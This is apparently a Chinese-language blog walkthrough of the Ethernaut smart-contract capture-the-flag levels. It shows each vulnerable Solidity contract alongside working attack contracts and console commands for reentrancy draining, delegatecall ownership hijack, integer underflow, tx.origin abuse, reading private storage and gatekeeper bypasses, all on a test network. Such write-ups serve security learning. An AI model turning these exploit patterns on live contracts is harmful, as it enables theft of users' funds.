done.2022.12.15



题目地址：[Ethernaut (openzeppelin.com)](https://ethernaut.openzeppelin.com/)

获取Rinkeby测试币：[Faucets | Chainlink](https://faucets.chain.link/rinkeby)

以太坊钱包 Metamask

Remix ide：http://remix.ethereum.org 

## Hello Ethernaut

Just follow the guide

## Fallback

目标是拿到这个合约的控制权，转出所有余额

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

考察fallback function，这里就是`receive()`

```js
await contract.contribute({value: 1});
//先调用一次contribute发送1 wei，让contributions[msg.sender] > 0
await contract.sendTransaction({value: 1});
//使用 sendTransaction 函数，给合约地址转账1 wei，触发 fallback 函数执行
await contract.withdraw();//转钱
await getbalance(contract.address)//检查合约余额，如果为0，那么任务完成
```

​      

p.s.从 0.6 开始，fallback函数写法有变化

```js
//0.6之前
function() external payable {
    currentBalance = address(this).balance + msg.value;
}
//0.6之后
fallback() external {
}
receive() payable external {
   currentBalance = currentBalance + msg.value;
}
```

- fallback 和 receive 不是普通函数，而是新的函数类型，有特别的含义，所以在它们前面不能加 function 这个关键字。加上 function 之后，它们就变成了一般的函数，只能按一般函数来去调用。
- 每个合约最多有一个不带任何参数不带 function 关键字的 fallback 和 receive 函数。
- receive 函数类型必须是 payable 的，并且里面的语句只有在通过外部地址往合约里转账的时候执行。
- fallback 函数类型可以是 payable，也可以不是 payable 的，如果不是 payable 的，可以往合约发送非转账交易，如果交易里带有转账信息，交易会被 revert；如果是 payable 的，自然也就可以接受转账了。
- 尽管 fallback 可以是 payable 的，但并不建议这么做，声明为 payable 之后，其所消耗的 gas 最大量就会被限定在 2300。

`fallback` 和 `receive` 的执行场景

```
          send Ether
               |
      msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()
```



## Fallout

目标是获得以下合约的所有权来完成这一关

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

注意到`Fallout` 的构造函数被写成了 `Fal1out` ，说明该函数不是构造函数，可以直接调用

```js
// 调用该函数，修改 owner
await contract.Fal1out();
// 确认是否修改成功
await contract.owner();
```

p.s.这题就算改名也不行，因为这题是0.6.0，已经不支持和合约同名的构造函数了

0.6及以后版本的构造函数写法为

```js
constructor() public {
}
```



## Coin Flip

连续猜中10次硬币翻转的结果

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

主要过程

- 获得上一块的 `hash` 值
- 判断与之前保存的 `hash` 值是否相等，相等则回退
- 根据 `blockValue/FACTOR` 的值判断为正或负，`FACTOR` 是2^255，即通过 `hash` 的首位判断

看似随机，但是可以被预测。

硬币翻转的结果完全取决于前一个块的hash值，可以先运行一次这个算法，看当前块下得到的coin flip，然后把结果传过去即可

```js
pragma solidity ^0.6.0;

contract CoinFlip {
    
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract exploit {
  CoinFlip expFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
  constructor(address aimAddr) public {
    expFlip = CoinFlip(aimAddr);
  }
 
  function hack() public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool guess = coinFlip == 1 ? true : false;
    expFlip.flip(guess);
  }
}
```

使用 http://remix.ethereum.org 部署到 Rinkeby测试网络上

连续hack十次即可，不过可能会失败，因为判断了revert()，需要不同区块hash，即一个区块只能执行一次

以太坊大约15秒生成一个区块

```js
await contract.address
//查看实例地址，在部署exp的时候需要输入这个地址
await contract.consecutiveWins()
//查看猜中次数
```



## Telephone

目标获取合约的所有权

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

`msg.sender`是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。

 `tx.origin` 是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，而且一定是账户地址而不是合约地址。

假设一种情况，账户A通过合约B调用合约C，账户 A -> 合约 B -> 合约 C 

- 对于合约B来说，`tx.origin` 和 `msg.sender` 都是账户A
- 对于合约C来说，`tx.origin` 是账户 A，`msg.sender` 是合约 B

因此这里部署一个第三方合约就行

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external ;
}

contract Attack {
    Telephone tel;
    constructor(address aimAddr) public {
        tel = Telephone(aimAddr);
    }

    function hack() public {
        tel.changeOwner(msg.sender);
    }
}
```



## Token

增加自己的token

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

每个人初始token20

`balances` 和 `value` 都是 uint，整数溢出，给任意地址转账21，就能让自己账户20-21产生溢出

```js
await contract.transfer('0xB2659555846f4732008152C78dEA6B7Acba11B4D',21)
//给任意地址转21，这里拿实例地址用了
await contract.balanceOf(player)
//查看自己的token，变为一个很大的数
```

## Delegation

拿到合约所有权

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

两种底层调用方式

> call 外部调用时，上下文是外部合约
>
> delegatecall 外部调用时，上下文是调用合约，相当于把代码复制过来在当前的环境执行

<img src="https://s3.bmp.ovh/imgs/2022/07/13/3bdbfef7a4655178.png" alt="7.png"  />

因此这里调用Delegate的pwn()函数就能得到Delegation的所有权

在solidty中可以通过method id（函数选择器）来调用函数

当给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数签名就是带有括号括起来的参数类型列表的函数名称。

因此整个过程是，通过fallback函数，传入的数据是pwn()的id，调用指定的pwn()函数

```js
await contract.sendTransaction({data:web3.utils.sha3("pwn()").slice(0,10)})
//or，keccak256就是sha3
await contract.sendTransaction({data:web3.utils.keccak256("pwn()").slice(0,10)})
```

## Force

让合约的balance大于0

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

好一个源码，没有接受转账的， 考虑`selfdestruct` 自毁合约强转

一个合约在自毁的时候，可以将余额全部强制转到另一个地址上

因此构造一个第三方合约，然后自毁，强制把合约里的资金转给实例合约即可

```js
pragma solidity ^0.6.0;

contract Exploit {
    constructor() public payable {}  // 部署的时候转一点eth
    function exp(address _challenge) public {
        address payable challenge = payable(_challenge);	//强转类型为address payable
        selfdestruct(challenge);//自毁强转
    }
}
```



## Vault

目标是打开vault，locked等于false

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

- 区块链上的所有信息是公开的
- 可以用 `web3` 的 `getStorageAt` 来访问合约里变量的值

getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1

```js
web3.eth.getStorageAt(contract.address, 1, function(x, y) {console.log(y)})
//得到password的byte形式
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
//传入解锁即可
```

## King

阻止其他人成为 King

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

主要是address.transfer()，当发送失败时会回滚状态

```js
await web3.utils.fromWei(await contract.prize())//查看目前价格，是0.001ether
```

Solidity中几种转账方式：

- **address.transfer()**
  当发送失败时会 throw ；回滚状态
  只会传递部分 Gas 供调用，防止重入，2300gas限制
- **address.send()**
  当发送失败时会返回 false
  只会传递部分 Gas 供调用，防止重入，2300gas限制
- **address.call.value()()**
  当发送失败时会返回 false
  传递所有可用 Gas 供调用，不能有效防止重入

当 transfer 调用失败时会回滚状态，所以只要前任国王拒绝接受转账就可以一直是国王

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address payable instance;
    constructor(address payable _address) public payable {
        instance = _address;
    }
    function hack() public {
        instance.call.value(0.001 ether)("");
    }
    fallback() external {
        revert();
    }
}
```

部署时传0.001ether，然后调用hack

注意一个小坑，交易的时候，要手动加大gas的限制，否则会报out of gas错误，不知道为什么……

## Re-entrancy

把合约账户的所有钱转出来

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

重入攻击

由于发送ether后才更新余额，同时call会调用转账地址的 fallback

如果 fallback 里再次调用了 withdraw ，由于没更新余额，if判断还是能通过，就会递归转账

这里的`address.call.value()()` 函数，传递了所有可用 `gas` 供调用，是可以成功执行递归的前提条件

```js
await getBalance(contract.address)
//查看实例合约的余额，0.001 ether
```

部署一个第三方合约

```js
pragma solidity ^0.6.0;

interface Reentrance {
  function donate(address _to) external payable ;
  function withdraw(uint _amount) external ;
}

contract Attack {
	Reentrance instance;
	constructor(address payable addr) public payable {
		instance = Reentrance(addr);
	}
	function call_donate() public payable {
		instance.donate.value(msg.value)(address(this));
	}
	function call_withdraw() public payable {
		instance.withdraw(0.001 ether);
	}
	fallback() external payable {
		instance.withdraw(0.001 ether);
	}
}
```

先call_donate()转0.001 ether，然后调用call_withdraw()，再次查看余额发现变为0

## Elevator

到达Building最高层，楼顶，也就是top=true

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

第一次 `building.isLastFloor(_floor)` 为false，第二次变成true即可

```js
pragma solidity ^0.6.0;
interface Elevator {
  function goTo(uint _floor) external;
}

contract Building {
	bool flag = true;
	Elevator elevator;
	constructor(address instance) public {
		elevator = Elevator(instance);
	}
	function isLastFloor(uint) public returns (bool) {
		flag = !flag;
		return flag;
	}
	function hack() public {
		elevator.goTo(1);
	}
}
```

你可以在接口使用 `view` 函数修改器来防止状态被篡改. `pure` 修改器也可以防止状态被篡改

这一关的另一个方法是构建一个 view 函数, 这个函数根据不同的输入数据返回不同的结果, 但是不更改状态, 比如 `gasleft()`.

## Privacy

解锁合约

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

和 Vault 那题有点像

每一个存储位是 32 个字节。根据 Solidity优化规则，当变量所占空间小于 32字节时，如果加上后面的变量也不超过 32 字节的话，会与后面的变量共享空间，因此storage情况为

```js
  bool public locked = true;			//0
  uint256 public ID = block.timestamp;	//1
  uint8 private flattening = 10;		//2
  uint8 private denomination = 255;		//2
  uint16 private awkwardness = uint16(now);//2
  bytes32[3] private data;			//3,4,5
```

查看data[2]，也就是第5个位置的值

```js
await web3.eth.getStorageAt(contract.address, 5)	//data[2]
'0xd41204b6311c26eb1c0fcb4d6401d8bd7400cd647cc9731557137ed8961d77a4'
```

unlock 需要 bytes16，而且在内部将 data[2] 强制转换为了 bytes16，这会取前 16 字节，所以最后调用 unlock

```js
await contract.unlock("0xd41204b6311c26eb1c0fcb4d6401d8bd")
await contract.locked()	//查看解锁情况
```

## Gatekeeper One

通过三个modifier的gate

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

第一个部署一个第三方合约绕过即可，第二个需要通过调试得知到达这一步的 gasleft() 是多少

第三个需要_gateKey的最后2字节和最后4字节一样，整个8字节和最后4字节不一样，最后4字节和玩家账户的最后2字节一样

设置为0x0000000100005893即可

第1次的时候先随便设置gas，调用enter时，传30000 gas，然后在 `etherscan` 查看 Geth Debug Trace

查看gasleft() opcodes GAS，得到这一步的剩余gas，为29746（29748 - 这一步消耗的 2 gas = 29746，也就是下一步的剩余gas）

[crytic/evm-opcodes: Ethereum opcodes and instruction reference (github.com)](https://github.com/crytic/evm-opcodes)

<img src="https://s3.bmp.ovh/imgs/2022/07/20/f7d1720b1cc11482.png" style="zoom:67%;" />

花费了30000-29746=254 gas，可以设置gas为 8191x4+254=33018，这样可以通过gateTwo()

```js
pragma solidity ^0.6.0;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}
contract Exp {
    GatekeeperOne challenge;
    bytes8 gatekey = 0x0000000100005893;
    constructor(address _addr) public {
        challenge = GatekeeperOne(_addr);
    }
    function exp() public {
        challenge.enter.gas(33018)(gatekey);
    }
}
```

## Gatekeeper Two

通过三个gate

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

- msg.sender != tx.origin，部署第三方合约调用即可
- 当前 caller 的 codesize 为 0，当合约还没创建完成的时候 codesize 为 0，因此写在 constructor 里即可
- gateKey 异或 sender 的 keccak256 的前 8 字节为 0-1=0xFFFFFFFFFFFFFFFF，本地计算然后传过去即可

```js
pragma solidity ^0.6.0;

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}
contract Exp {
    GatekeeperTwo challenge;
    constructor(address _addr) public {
        challenge = GatekeeperTwo(_addr);
		uint64 gateKey = (uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(this))));
		challenge.enter(bytes8(gateKey));
    }
}
```

## Naught Coin

NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

ERC20的子合约	[ERC20.sol ](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)

题目中只override了transfer函数，让我们10年后才能取钱，但是并没有重写这个transferFrom函数，可以尝试利用这个函数

```js
contract ERC20 is Context, IERC20, IERC20Metadata {
	//……

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

}
```

需要通过 `_spendAllowance(from, spender, amount);`  也就是`_allowances[owner][spender]>=amount`

因此先调用approve，给自己授权转账金额，再调用transferFrom把自己的钱转走即可

```js
await web3.utils.fromWei(await contract.balanceOf(player))	//'1000000'
await contract.approve(player, web3.utils.toWei("1000000"))	//授权
await contract.transferFrom(player, contract.address, web3.utils.toWei("1000000"))	//从自己这里转出去
```

## Preservation

获取合约所有权

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

第7关 Delegation 的知识点

`delegatecall`是上下文调用，相当于把代码复制过来在当前的环境执行，`storage` 等数据均使用自己的，这就使得某些访存操作会错误地处理对象

调用`LibraryContract`的`setTime`时，修改的实际上是`Preservation`合约`storage`中对应位置的slot0，也就是`timeZone1Library`

可以把这个`timeZone1Library`变为攻击合约的地址，这样第二次调用`setTime`时，调用的是攻击合约内的`setTime`，修改`owner`即可

```js
pragma solidity ^0.6.0;

interface Preservation {
  function setFirstTime(uint _timeStamp) external;
  function setSecondTime(uint _timeStamp) external;
}

contract Attack {
  
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;  

  Preservation instance;
  constructor(address _instance) public {
    instance = Preservation(_instance);
  }

  function attack_1() public {
    instance.setFirstTime(uint(address(this)));
  }
  function attack_2() public {
    instance.setFirstTime(1);
  }
  function setTime(uint _time) public {
    owner=tx.origin;
  } 
}
```

先调用 attack_1，再调用 attack_2

调用 attack_2 的时候发生 out of gas 错误，可能是调用的次数有点多，gas估计错误，交易的时候要增大gas限制

## Recovery

合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署第一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 

此后，他们丢失了合约地址。 如果您可以从丢失的合约地址中恢复（或移除）0.001 以太币，则此 level 将完成。

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

调用了 generateToken 函数生成了一个 SimpleToken，但是不知道生成的合约地址

这个直接去 [Rinkeby Etherscan](https://rinkeby.etherscan.io/) 上看就行

<img src="https://s3.bmp.ovh/imgs/2022/08/01/285db815417a2650.png" alt="image-20220726113844462" style="zoom:67%;" />

查到生成合约的地址为 0xA18a26Cd7ec5E9a8E3AAad7aaecfE3E08ae4e8e3

在 remix 部署 SimpleToken ，使用 `At address` 指定 `lost contract` 的地址，然后执行 `destroy()` 自毁转钱即可

​         

方法二

参考：[私钥丢失也能找回以太币？ - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/blockchain-articles/179662.html)

合约地址是确定性的，由 `keccack256(address,nonce)` 计算。(其中 `address` 是合约的地址(或创建交易的以太坊地址)，而 `nonce` 是合约生产其它合约的一个数值(或者对于常规交易来说是交易的`nonce`))

```
address = sha3(rlp_encode(creator_account, creator_account_nonce))[12:]
```

从本质上讲，合约的地址就是账户与交易 nonce 串联的 keccak256 哈希值。

合约的 nonce 是以 1 开始的，账户的交易 nonce 是以 0 开始的。

```python
#python2
def rlp_encode(input):
    if isinstance(input,str):
        if len(input) == 1 and ord(input) < 0x80: return input
        else: return encode_length(len(input), 0x80) + input
    elif isinstance(input,list):
        output = ''
        for item in input: output += rlp_encode(item)
        return encode_length(len(output), 0xc0) + output

def encode_length(L,offset):
    if L < 56:
         return chr(L + offset)
    elif L < 256**8:
         BL = to_binary(L)
         return chr(len(BL) + offset + 55) + BL
    else:
         raise Exception("input too long")

def to_binary(x):
    if x == 0:
        return ''
    else:
        return to_binary(int(x / 256)) + chr(x % 256)

print rlp_encode(["295D050a4ebf56105D7d0A9FDECB1331E7b7283B".decode('hex'),"01".decode('hex')]).encode('hex')

#d694295d050a4ebf56105d7d0a9fdecb1331e7b7283b01
```

`solidity` 计算地址

```
pragma solidity ^0.4.18;
contract test{
    function func() public view returns (address){
        return address(keccak256(0xd694295d050a4ebf56105d7d0a9fdecb1331e7b7283b01));
    }
}
```

算出的地址也是 0xA18a26Cd7ec5E9a8E3AAad7aaecfE3E08ae4e8e3

## MagicNumber

题目要求即写一个合约，字节码不超过 10 个字节，在调用 whatIsTheMeaningOfLife() 时返回 42

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

参考 [Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by 0xSage | Coinmonks | Medium](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)

合约创建的过程

<img src="https://s3.bmp.ovh/imgs/2022/08/13/dac9ac3c4a2fb0b4.jpeg" alt="28" style="zoom:67%;" />

构造字节码

```js
runtime codes
PUSH1 0x2a  ; 将 42 压入栈中(42是)
PUSH1 0x80  ; 要存储的位置，一般为 0x80
MSTORE      ; 设置 memory[0x80:0x80+0x20] = 0x2a
PUSH1 0x20  ; length 
PUSH1 0x80  ; offset
RETURN      ; return memory[0x80:0x80+0x20]


initialization codes
PUSH1 0x0a  ; length, runtime code 长度为 10 (0x0a)
PUSH1 0x0c  ; offset, 即 initialization codes 的长度，整体算下来为 0x0C
PUSH1 0x00  ; destOffset, 存入内存中起始位置
CODECOPY    ; 将 runtime code 拷贝到内存开头
PUSH1 0x0a  ; length
PUSH1 0x00  ; offset
RETURN      ; 返回 runtime code
```

最后根据 [crytic/evm-opcodes: Ethereum opcodes and instruction reference (github.com)](https://github.com/crytic/evm-opcodes)

得到最后opcodes  0x600a600c600039600a6000f3602a60805260206080f3

